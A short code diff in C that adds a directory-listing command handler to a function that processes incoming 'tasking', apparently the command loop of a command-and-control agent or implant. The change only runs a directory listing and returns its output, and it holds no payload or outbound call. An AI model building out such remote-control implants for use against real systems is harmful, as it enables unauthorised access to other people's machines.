@@ -32,6 +32,12 @@ BOOL handleGetTasking(PParser getTasking)
 			addBytes(response, (PBYTE)output->buffer, output->length, TRUE);
 			freePackage(output);
 		}
+		else if (taskCmd == DIR_CMD)
+		{
+			PPackage output = executeDir(taskParser);
+			addBytes(response, (PBYTE)output->buffer, output->length, TRUE);
+			freePackage(output);
+		}
 		else if (taskCmd == EXIT_CMD)
 		{
 			// Send response before exiting
